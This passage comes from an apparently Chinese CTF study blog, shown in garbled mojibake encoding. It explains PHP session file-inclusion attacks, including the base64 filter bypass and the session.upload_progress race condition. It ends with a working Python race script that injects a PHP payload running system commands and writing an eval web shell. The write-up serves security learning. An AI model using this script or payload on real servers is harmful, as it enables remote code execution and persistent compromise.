åç¼€çš„æ–‡ä»¶ï¼Œphpé‡Œé¢æˆ‘ä»¬èƒ½æ§åˆ¶çš„å”¯ä¸€çš„é‚£å°±åªèƒ½æ˜¯sessionï¼Œæ‰€ä»¥è¿™é“é¢˜ç›®å°±æ˜¯ä»è¿™é‡Œçœ‹å‡ºæˆ‘ä»¬è¦é‡‡ç”¨çš„æ–¹æ³•æ˜¯session.upload_progress</p><p>ä¸‹é¢çš„å†…å®¹æ‘˜è‡ªç½‘ç»œ</p><p>åœ¨äº†è§£sessionåŒ…å«æ–‡ä»¶æ¼æ´åŠç»•è¿‡å§¿åŠ¿çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥é¦–å…ˆäº†è§£ä¸€ä¸‹æœåŠ¡å™¨ä¸Šé’ˆå¯¹ç”¨æˆ·ä¼šè¯sessionçš„å­˜è´®å’Œå¤„ç†è¿‡ç¨‹æ˜¯ä»€ä¹ˆã€‚</p><p>phpå°†sessionä»¥æ–‡ä»¶çš„å½¢åŠ¿å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æŸä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿›è¡ŒåŒ…å«çš„æ—¶å€™çŸ¥é“æ–‡ä»¶çš„é»˜è®¤å­˜è´®ä½ç½®æ˜¯å¿…éœ€çš„</p><p>é»˜è®¤è·¯å¾„ï¼š</p><p>/var/lib/php/sess_PHPSESSID</p><p>/var/lib/php/sessions/sess_PHPSESSID</p><p>/tmp/sess_PHPSESSID</p><p>/tmp/sessions/sess_PHPSESSID</p><p>çŸ¥é“è·¯å¾„ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“æœåŠ¡å™¨æ˜¯æ€ä¹ˆå­˜æ”¾æ–‡ä»¶çš„ï¼Œå°±æ˜¯æ‰€æˆ‘ä»¬éœ€è¦çŸ¥é“æœåŠ¡å™¨å­˜æ”¾æ–‡ä»¶çš„æ–‡ä»¶åç§°ï¼Œå®ƒçš„å‘½åæ ¼å¼æ˜¯ä»€ä¹ˆï¼Œåªæœ‰è¿™æ ·çš„è¯æˆ‘ä»¬æ‰èƒ½æ›´å¥½çš„åŒ…å«</p><p>sessionçš„å‘½åæ ¼å¼æ˜¯sess_[phpsessid],phpsessidåœ¨å‘é€çš„cookieä¸­å¯ä»¥çœ‹åˆ°</p><p>å¥½äº†ï¼Œä¸Šè¿°æˆ‘ä»¬çŸ¥é“äº†phpæ˜¯æ€ä¹ˆå­˜å‚¨sessionæ–‡ä»¶çš„ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹phpæ˜¯æ€ä¹ˆå¤„ç†ç”¨æˆ·çš„sessionä¼šè¯ä¿¡æ¯çš„ã€‚</p><p>phpä¸­é’ˆå¯¹ç”¨æˆ·ä¼šè¯çš„å¤„ç†æ–¹å¼ä¸»è¦å–å†³äºæœåŠ¡å™¨åœ¨php.iniæˆ–ä»£ç ä¸­å¯¹session.serialize_handler(æå¸¦æ’ä¸€å˜´ï¼Œæˆ‘è®°å¾—è¿™ç©æ„æˆ‘åœ¨åšååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿè§è¿‡ï¼Œä½†æ˜¯è‡³äºè¯¥æ€ä¹ˆåº”ç”¨åˆ°è§£é¢˜æ–¹å‘ä¸Šï¼Œæˆ‘æš‚æ—¶æƒ³ä¸å‡ºæ¥äº†ï¼Œå˜¤å˜¤å˜¤ï¼Œç­‰æŠŠæ–‡ä»¶åŒ…å«å­¦å®Œäº†åœ¨å»å¤ä¹ ä¸€ä¸‹ååºåˆ—åŒ–)</p><p>æˆ‘ä»¬éœ€è¦çŸ¥é“phpæ€ä¹ˆå¤„ç†sessionä¿¡æ¯çš„ï¼Œæ‰èƒ½å‘sessionæ–‡ä»¶ä¸­æ’å…¥æˆ‘ä»¬æƒ³çš„getshellçš„æ¶æ„ä»£ç </p><p>phpé»˜è®¤çš„ä¼šè¯å¤„ç†æ–¹å¼å°±æ˜¯session.serialize_handler=php</p><p><img src="1.jpg"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°åªæœ‰ç”¨æˆ·åçš„å†…å®¹è¿›è¡Œäº†åºåˆ—åŒ–çš„å­˜è´®ï¼Œä½†æ˜¯å˜é‡åæ²¡æœ‰ï¼Œusername|s:4:â€™Qftmâ€™</p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬é‡‡ç”¨session.serialize_handler=php_serialize å°±å¯ä»¥å‘ç°æ— è®ºæ˜¯å˜é‡åè¿˜æ˜¯å˜é‡çš„å†…å®¹éƒ½è¢«è¿›è¡Œäº†åºåˆ—åŒ–çš„å­˜å‚¨ï¼Œè¿™é‡Œå°±ä¸é…å›¾äº† a:1:{s:8:â€™usernameâ€™;s:4:â€™Qftmâ€™}</p><p>è¿™ä¸¤ç§å­˜å‚¨æ–¹å¼ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦åˆç†åˆ©ç”¨è¿™ä¸¤ç§æ–¹å¼</p><p>å¥½äº†ï¼Œä¸Šè¿°æˆ‘ä»¬å·²ç»äº†è§£äº†sessionçš„å­˜å‚¨å’Œå¤„ç†æœºåˆ¶ï¼Œç°åœ¨æˆ‘ä»¬å°±è¦æ·±å…¥çš„äº†è§£ä¸€ä¸‹sessionæ–‡ä»¶åŒ…å«æ¼æ´</p><p>ç®€å•çš„è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶sessionæ–‡ä»¶é‡Œçš„ä¸€äº›å†…å®¹ï¼Œå°†è¿™äº›å†…å®¹å˜ä¸ºæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œç„¶åå°†è¿™äº›å†…å®¹åŒ…å«åˆ°sessionæ–‡ä»¶é‡Œé¢å»ï¼Œå°±å¯ä»¥æ‹¿åˆ°æœåŠ¡å™¨æƒé™</p><p>ç°åœ¨æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„æ¡ˆä¾‹æ¥è¯´æ˜ä¸€ä¸‹</p><p>session.php</p><pre><code>&lt;?phpsession_start();$username=$_POST[&#39;username&#39;];$_SESSION[&quot;username&quot;]=$username;</code></pre><p>index.php</p><pre><code>&lt;?php$file=$_GET[&#39;file&#39;];include($file);</code></pre><p>ä»session.phpä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªsessionæ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ’å…¥ä¸€æ®µæ¶æ„ä»£ç </p><p><img src="7.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¼šè¯äº§ç”Ÿï¼Œæˆ‘ä»¬ä¹Ÿå¾—åˆ°äº†phpsessidï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥çš„æ„é€ </p><p><img src="2.jpg"></p><p>è¿™æ˜¯å¤åˆ¶åˆ«äººçš„å›¾ï¼Œæˆ‘å®éªŒçš„æ—¶å€™æ²¡æœ‰æˆåŠŸåº”è¯¥æ˜¯php.iniè®¾ç½®çš„æœ‰é—®é¢˜ï¼Œæœæ–­æ—¶é—´è¯•è¯•åœ¨kaliä¸Šä¸‹è½½ä¸€ä¸ªphpstudyå¥½å¥½ç©ç©</p><p>å˜¿å˜¿ï¼Œæˆ‘æ•´å‡ºæ¥äº†</p><p><img src="9.PNG"></p><p><img src="10.PNG"></p><p>å¯¹ä¸Šè¿°å®éªŒåšä¸€ä¸ªå°ç»“ï¼Œæˆ‘ä»¬çœ‹åœ¨sessioné‚£é‡Œæ˜¯å¯ä»¥ä¼ å…¥sessionï¼Œè€Œä¸”ä¸å—é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ˜¯ä»¥ä¼ å…¥æˆ‘ä»¬å†™çš„æ¶æ„ä»£ç ï¼Œphpå°†æˆ‘ä»¬ä¼ å…¥çš„sessionè¿›è¡Œå¤„ç†å­˜å‚¨åœ¨/var/lib/php/sessioné‡Œé¢ï¼Œè¿™æ˜¯è·¯å¾„æˆ‘ä»¬å¯ä»¥é€šè¿‡phpinfoï¼ˆï¼‰è¿›è¡ŒæŸ¥çœ‹ã€‚ç„¶ååœ¨index.phpä¸­å­˜åœ¨includeå‡½æ•°ï¼Œå½“æˆ‘ä»¬çŸ¥é“äº†sessionå­˜è´®çš„è·¯å¾„å’Œæ–‡ä»¶åä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†æˆ‘ä»¬çš„ä»£ç åŒ…å«è¿›å»ï¼Œç„¶åé€šè¿‡postæˆ–è€…getæ–¹å¼è¿›è¡Œgetshellã€‚</p><p>å¾ˆç®€å•æ˜¯å§ï¼Œå¦‚æœè¿™ä¹ˆç®€å•çš„è¯é‚£æˆ‘ä»¬çš„ä¿¡æ¯å°†å˜å¾—å¤šä¹ˆå»‰ä»·ï¼Œéšä¾¿ç›—å–å°±å¯ä»¥æ‹¿èµ°ï¼Œæ‰€ä»¥æœåŠ¡å™¨åœ¨å¯¹ç”¨æˆ·ä¿¡æ¯çš„å¤„ç†è‚¯å®šæ˜¯åšäº†å¾ˆå¤šçš„é™åˆ¶</p><p>session base64encode</p><p>å¾ˆå¤šæ—¶å€™æœåŠ¡å™¨ä¸Šçš„sessionçš„ä¿¡æ¯ä¼šç”±base64ç¼–ç ååœ¨è¿›è¡Œå­˜è´®ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œæœ¬åœ°åŒ…å«çš„æ—¶å€™è¦æ€ä¹ˆè¿›è¡Œç»•è¿‡å‘¢ï¼Ÿ</p><p>å†çœ‹ä¸€ä¸ªä¾‹å­</p><p>session.php</p><pre><code>&lt;?phpsession_start();$username=$_POST[&#39;username&#39;];$_SESSION[&quot;username&quot;]=base64_encode($username);echo &quot;user-&gt;$username&quot;;</code></pre><p>index.php</p><pre><code>&lt;?php$file=$_GET[&#39;file&#39;];include($file);</code></pre><p><img src="8.png"></p><p>ç„¶åå½“æˆ‘ä»¬åƒä¸Šè¿°ä¾‹å­ä¸­åŒ…å«æ¶æ„ä»£ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œæˆ‘ä»¬çš„å†…å®¹è¢«base64ç¼–ç äº†</p><p><img src="3.jpg"></p><p>é‚£ä¹ˆæˆ‘ä»¬æƒ³æ˜¯ä¸æ˜¯æˆ‘ä»¬å¯¹ä»–è¿›è¡Œè§£ç åœ¨åŒ…å«æ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼Ÿ</p><p>?file=php://filter/read=convert.base64-decode/resource=/var/lib/php/session/sess_phpsessid</p><p><img src="4.jpg"></p><p><img src="11.PNG"></p><p>ä½†æ˜¯ä¹±ç äº†ï¼ï¼ï¼</p><p>æ˜¯å› ä¸ºserialize_handler=phpçš„åŸå› </p><p>ä¸Šè¿°çš„å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰æˆ‘ä»¬ä¼ å…¥çš„æ¶æ„ä»£ç çš„åœ°æ–¹è¢«è¿›è¡Œäº†ç¼–ç ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„usernameåˆ™ä¸ªå˜é‡åæ²¡æœ‰è¿›è¡Œç¼–ç ï¼Œä½†æ˜¯æˆ‘ä»¬å…¨éƒ¨å°†å…¶è¿›è¡Œäº†è§£ç ï¼Œä»¥è‡³äºé€ æˆäº†ä¹±ç </p><p>é‚£æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½ç„¶åªæœ‰base64ç¼–ç çš„åœ°æ–¹è¿›è¡Œè§£ç ï¼Œå…¶ä»–åœ°æ–¹çš„ä¿æŒä¸å˜ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œç°åœ¨è®©æˆ‘ä»¬äº†è§£ä¸€ä¸‹base64ç¼–ç ä¸è§£ç çš„åŸç†(ps:æˆ‘è®°å¾—base64ç¼–ç ä¸è§£ç çš„åŸç†ï¼Œåœ¨å½“æ—¶å®éªŒå®¤é¢è¯•çš„æ—¶å€™æœ‰å­¦é•¿é—®è¿‡æˆ‘ï¼Œæˆ‘ä¸ä¼šï¼Œç°åœ¨ä¾ç„¶ä¸ä¼šã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æ„Ÿè°¢è¿™ç¯‡æ–‡ç« çš„ä½œè€…ï¼ï¼ï¼)</p><h3>base64ç¼–ç è§£ç </h3><p>æˆ‘ä»¬çŸ¥é“base64æ˜¯ä½¿ç”¨äº†64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼ˆa-z,A-Z,0-9,+,/ï¼‰å°†ä»»æ„å­—ç¬¦åºåˆ—ç¼–ç æˆasciiå­—ç¬¦ä¸²ä»¥åŠâ€˜=â€™ç”¨ä½œåç¼€ç”¨é€”</p><p>base64ç´¢å¼•è¡¨</p><p><img src="5.jpg"></p><p>base64ç¼–ç çš„è¿‡ç¨‹</p><p>å°†è¾“å…¥çš„å­—ç¬¦ä¸²æŒ‰å­—èŠ‚è¿›è¡Œåˆ‡åˆ†ï¼Œä¸è¶³8æ¯”ç‰¹çš„é«˜ä½è¡¥é›¶ï¼Œç„¶åå–å…¶äºŒè¿›åˆ¶ï¼Œç„¶åå°†è¿™äº›äºŒè¿›åˆ¶ä¸²è”èµ·æ¥ï¼ŒæŒ‰ç…§6æ¯”ç‰¹è¿›è¡Œåˆ‡åˆ†ï¼Œå› ä¸º2^6=64ï¼Œç„¶ååœ¨base64ç´¢å¼•è¡¨ä¸­æŸ¥æ‰¾å…¶å¯¹å°çš„å€¼ï¼Œç„¶åå°†ä¸Šè¿°çš„ç»“æœä¸²è”èµ·æ¥å°±æ˜¯æˆ‘ä»¬è¦çš„base64ç¼–ç åçš„ç»“æœ</p><p>ç”±äºäºŒè¿›åˆ¶çš„æ˜¯æŒ‰ç…§8æ¯”ç‰¹ä¸€ç»„è¿›è¡Œä¼ è¾“ï¼Œç„¶åæŒ‰ç…§6æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œçš„äºŒè¿›åˆ¶çš„æ•°æ®å¿…éœ€æ˜¯24æ¯”ç‰¹çš„å€æ•°ï¼Œå› ä¸º24æ¯”ç‰¹æ˜¯ï¼ˆ6å’Œ8çš„æœ€å°å€æ•°ï¼‰ï¼Œ24æ¯”ç‰¹å°±æ˜¯3å­—èŠ‚ï¼Œå¦‚æœåŸå­—èŠ‚çš„æ•°æ®é•¿åº¦ä¸æ˜¯3çš„å€æ•°ä¸”å‰©ä¸‹ä¸€ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åœ¨ç¼–ç çš„ç»“æœåŠ ä¸€ä¸ª=ï¼›è‹¥å‰©ä¸‹ä¸¤ä¸ªè¾“å…¥æ•°æ®ï¼Œåˆ™åŠ ä¸€ä¸ª==</p><p><img src="6.jpg"></p><p>é€šè¿‡è¿™å¼ å›¾æˆ‘ä»¬å¯ä»¥æ›´ç›´è§‚çš„è¿æ¥ç¼–ç çš„è¿‡ç¨‹</p><p>è§£ç è¿‡ç¨‹å°±æ˜¯ç¼–ç çš„é€†è¿‡ç¨‹</p><p><a href="https://blog.csdn.net/wo541075754/article/details/81734770">è¯¦ç»†å­¦ä¹ </a></p><p>base64è§£ç çš„ç‰¹ç‚¹ï¼šbase64ç¼–ç çš„æ—¶å€™åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€Œphpåœ¨è§£ç çš„æ—¶å€™å¦‚æœé‡åˆ°äº†ä¸å¯æ‰“å°çš„å­—ç¬¦ï¼Œå°±å°†å…¶è·³è¿‡ï¼Œä»…å°†åˆæ³•çš„å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼ˆpsï¼šè¿™å¥è¯å¥½åƒåœ¨å“ªé‡Œå¬åˆ°è¿‡ï¼Œå¥½åƒæ˜¯ä¸€é“ctfé¢˜ç›®ç”¨åˆ°äº†è¿™ä¸ªç‰¹ç‚¹ï¼Œaaaæƒ³ä¸èµ·æ¥åœ¨å“ªé‡Œåšè¿‡è¿™ä¸ªçš„é¢˜ç›®ï¼Œæœç„¶åšäº†å¥½å¤šé¢˜ç›®ä¾æ—§å•¥éƒ½ä¸ä¼šã€‚ã€‚ã€‚ï¼‰</p><p><img src="7.jpg"></p><p>å¥½äº†ä»‹ç»äº†è¿™ä¹ˆå¤šæˆ‘ä»¬è¦å›å½’æ­£é¢˜äº†</p><p>å…¶å®ä¸Šè¿°çš„æˆ‘ä»¬ä¼ å…¥çš„usernameä¹‹åè¿›è¡Œç¼–ç ä¹‹åï¼Œæ˜¯é•¿è¿™æ ·çš„ username|s:40:â€™base64ç¼–ç çš„å†…å®¹â€™ï¼Œæˆ‘ä»¬çŸ¥é“base64åœ¨è§£ç çš„æ—¶å€™æ˜¯å°†å››å­—èŠ‚è½¬åŒ–ä¸º3å­—èŠ‚ï¼Œbase64ç¼–ç çš„å†…å®¹æ˜¯ä¸€å®šæ»¡è¶³è¿™ä¸ªé“ç†çš„ï¼Œä½†æ˜¯å‰é¢çš„å†…å®¹å¦‚æœä¸æ»¡è¶³è¿™ä¸ªé“ç†å°±ä¼šé€ æˆä¹±ç </p><p>ä¾ç…§è¿™ä¸ªé“ç†ï¼Œå¦‚æœsessionå­˜è´®ä¿¡æ¯ä¸­ç”¨æˆ·åç¼–ç åçš„é•¿åº¦ä¸ºä¸ªä½æ•°ï¼Œå°±æ˜¯s:0-9ï¼Œé‚£ä¹ˆusername|s:0-9:â€ï¼Œè¿™éƒ¨åˆ†é•¿åº¦æ˜¯14ï¼Œå®é™…è§£ç çš„éƒ¨åˆ†æ˜¯username0-9ï¼Œå®é™…é•¿åº¦æ˜¯10ï¼Œç¼ºå°‘äº†ä¸¤ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è¡¥ä¸ºï¼šusername0-9XX,å¦‚æœæ˜¯s:10-99,æˆ‘ä»¬éœ€è¦å°†å…¶è¡¥ä¸ºusername10-99X,ä½†æ˜¯å¦‚æœç”¨æˆ·åç¼–ç æ˜¯3ä½æ•°ï¼Œå°±æ­£å¥½æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚</p><p><img src="12.PNG"></p><p><img src="13.PNG"></p><p>å˜¤å˜¤å˜¤å¥½æƒ³è¯•ä¸€è¯•ï¼Œä½†æ˜¯å°±æ˜¯ä¸çŸ¥é“å“ªä¸€ç‚¹å‡ºé”™äº†æ‰€ä»¥å°±æ˜¯ä¸è¡Œï¼Œç­‰æŠŠä½œä¸šè¡¥å®Œäº†åœ¨kaliä¸Šæä¸€æ</p><p>å›é¡¾ä¸€ä¸‹è¿™ä¸ªå®éªŒï¼š</p><p>é¦–å…ˆè¿™ä¸ªæ¯”ä¸Šä¸€ä¸ªå®éªŒåŠ äº†base64ç¼–ç ï¼Œå°±é€ æˆæˆ‘ä»¬æƒ³æ’å…¥ä»£ç ï¼Œä½†æ˜¯è¢«ç¼–ç ï¼Œé€ æˆæˆ‘ä»¬ä¸èƒ½æˆåŠŸçš„è¿›è¡ŒåŒ…å«ã€‚ä½†æ˜¯æˆ‘ä»¬æƒ³å¦‚æœæˆ‘ä»¬å°†å…¶è¿›è¡Œè§£ç ï¼Œå°±å¯ä»¥æˆåŠŸçš„è¿›è¡ŒåŒ…å«ï¼Œä½†æ˜¯æˆ‘ä»¬åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºusername|s:è¿™éƒ¨åˆ†æ˜¯æ²¡æœ‰è¿›è¡Œç¼–ç çš„ï¼Œå¦‚æœå®ƒä»¬å­—èŠ‚çš„é•¿åº¦ä¸æ»¡è¶³æˆ‘ä»¬è§£ç çš„è§„åˆ™æˆ‘ä»¬å°±ä¼šäº§ç”Ÿä¹±ç ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦åœ¨æˆ‘ä»¬çš„ç¼–ç çš„æ—¶å€™å»å°†å­—ç¬¦ä¸²çš„é•¿åº¦æåˆ°ä¸‰ä½æ•°ç¬¦åˆæˆ‘ä»¬çš„è§„åˆ™å³å¯</p><p>æ˜¨å¤©æ™šä¸Šæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œè¿™ç©æ„æˆ‘åœ¨ctfä¸­èƒ½å¹²å•¥ï¼Œæ„Ÿè§‰ctfä¸­å¦‚æœè¦ç”¨ä¸Šè¿™æ–¹é¢çš„çŸ¥è¯†ï¼Œå‡ºé¢˜äººè‚¯å®šä¼šæ•´å¾ˆå¤šé™åˆ¶ï¼Œå°±æ¯”å¦‚æœè¯´æŠŠâ€˜.â€™ç»™è¿‡æ»¤äº†</p><p>å¦‚æœå®ƒçš„phpå¤„ç†æ–¹å¼è®¾ç½®ä¸ºserialize_handler=php_serialze?è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>å…¶å®æˆ‘ä»¬çŸ¥é“php_serializeå¤„ç†çš„ä¿¡æ¯æ˜¯é•¿è¿™æ ·çš„ï¼ša:1:{s:8:â€usernameâ€;s:12:â€PD8xMjM/Pg==â€;}ï¼Œé™¤å»ä¸å¯å»ºå­—ç¬¦æ˜¯a1s8usernames12æ˜¯15ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†é•¿åº¦æ‰©åˆ°ä¸‰ä½æ•°ï¼Œå°±æ¬§å…‹äº†åšæ³•åŒä¸Šè¿°çš„æ–¹æ³•ç›¸åŒ</p><h3>no session_start</h3><p>ç»ˆäºåˆ°äº†æ¶‰åŠåˆ°æœ¬é¢˜ç›®çš„çŸ¥è¯†ç‚¹äº†</p><p><img src="14.png"></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹é¢˜ç›®ï¼Œæ²¡æœ‰session_startï¼Œæˆ‘ä»¬çŸ¥é“session_starté€šå¸¸ä½œä¸ºä¼šè¯çš„å¼€å§‹å‡ºç°åœ¨ç½‘ç«™çš„ç™»å½•é¡µé¢ï¼Œä½†æ˜¯å¦‚æœä¸€ä¸ªå ç‚¹åˆLFIæ¼æ´ä½†æ˜¯å´æ²¡æœ‰session_startï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŒ…å«ç”¨æˆ·ä¿¡æ¯å‘¢ï¼Ÿ</p><p>å¾ˆå·§ã€‚ç³»ç»Ÿæœ¬èº«æœ‰åœ°æ–¹å¸®åŠ©æˆ‘ä»¬äº§ç”Ÿsessionï¼Œå¹¶ä¸”æœ‰ä¸€éƒ¨åˆ†æ˜¯å¯æ§çš„</p><p>æ‰€ä»¥æˆ‘ä»¬å°±è¦äº†è§£ä¸€ä¸‹sessionåœ¨ç³»ç»Ÿä¸­çš„é…ç½®</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsession.use_strict_modeçš„å€¼æ˜¯0ï¼Œæ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰è‡ªå·±çš„session idçš„ï¼Œå°±æ¯”å¦‚è¯´å¦‚æœæˆ‘ä»¬è®¾ç½®cookieä¸ºluckyï¼Œé‚£ä¹ˆphpå°±ä¼šåœ¨æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªsess_luckyçš„æ–‡ä»¶,ä½†æ˜¯è¿™ä¸ªæŠ€å·§çš„å®ç°éœ€è¦æˆ‘ä»¬åˆå§‹åŒ–å°±æ˜¯session_startï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬è®¨è®ºçš„å°±æ˜¯ç«™ç‚¹æ²¡æœ‰åˆå§‹åŒ–è¿™ä¸ªè¿‡ç¨‹ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠå‘¢</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹php.iniä¸­å‡ ä¸ªå…³é”®çš„é…ç½®</p><p><img src="16.PNG"></p><p><img src="17.PNG"></p><blockquote><p>session.auto_start:é¡¾åæ€ä¹‰ï¼Œå¦‚æœå¼€å¯è¿™ä¸ªé€‰é¡¹ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆå§‹åŒ–sessionï¼Œä½†æ˜¯ä¸å·§çš„æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„<br><br>session.upload_progress.enabled=on,é»˜è®¤æƒ…å†µä¸‹å°±æ˜¯å¼€å¯çš„ï¼Œphpèƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™æ£€æµ‹ä¸Šä¼ è¿›åº¦</p></blockquote><blockquote><p>session.upload_progress.cleanup=on:é»˜è®¤å¼€å¯ï¼Œå°±æ˜¯ä¸€æ—¦æ–‡ä»¶ä¸Šä¼ ç»“æŸï¼Œå°±ç«‹åˆ»åˆ é™¤å¯¹åº”çš„sessionå†…å®¹</p></blockquote><blockquote><p>session.upload_progress:æœ€åˆæ˜¯phpä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œphpå°†ä»¥æµçš„å½¢åŠ¿ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨sessionä¸­ï¼Œå³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–sessionï¼Œphpä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–session</p></blockquote><blockquote><p>session.upload_progress.nameåŒåå˜é‡æ—¶ï¼ˆè¿™éƒ¨åˆ†æ•°æ®ç”¨æˆ·å¯æ§ï¼‰ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨sessionä¸­è·å–ã€‚å½“phpæ£€æµ‹åˆ°è¿™ç§postè¯·æ±‚çš„æ—¶å€™ï¼Œå®ƒä¼šåœ¨sessionä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œç´¢å¼•æ—¶session.upload_progress.prefix=â€upload_progress_â€ï¼Œä¸session.upload-progress.nameè¿èµ·æ¥çš„å€¼</p></blockquote><p>å› ä¸ºæœ‰cleanå­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦åœ¨cleanä¹‹å‰æŠŠæˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«è¿›å»ï¼Œè„šæœ¬</p><pre><code>import ioimport sysimport requestsimport threadingsessid = &#39;Qftm&#39;def POST(session):    while True:        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)        session.post(            &#39;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#39;,            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;cat *&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[mtfQ])?&gt;&#39;);?&gt;&quot;&#125;,               files=&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,            cookies=&#123;&#39;PHPSESSID&#39;:sessid&#125;        )def READ(session):    while True:        response = session.get(f&#39;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#39;)        if &#39;flag&#39; not in response.text:                print(&#39;[+++]retry&#39;)        else:            print(response.text)               sys.exit(0)with requests.session() as session:    t1 = threading.Thread(target=POST, args=(session, ))    t1.daemon = True    t1.start()    READ(session)</code></pre><p>è¡¨å•å°è¯•å¤±è´¥ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</title>
      <link href="/2021/05/07/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/05/07/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>å…ˆè·³è¿‡sqlï¼Œä¹¦æœ¬è®²çš„å¾ˆå¥½ï¼Œä½†æ˜¯ä»Šå¤©è¿™ä¸ªçœŸçš„å°±ä¸æ˜¯ç‰¹åˆ«å¼€å¿ƒï¼Œå¾ˆå¥‡æ€ªä¸ºä»€ä¹ˆä¹¦æœ¬åœ¨è®²è§£ä¾‹é¢˜çš„æ—¶å€™ä¸æŠŠç¯å¢ƒæ”¾å‡ºæ¥ï¼Œè¿™æ ·å°±å¯ä»¥è·Ÿå¥½çš„ç»ƒä¹ äº†ã€‚</p><span id="more"></span><h2>HCTF2016å…µè€…å¤šè¯¡</h2><p>åœ¨githubä¸Šä¸‹è½½äº†æºç 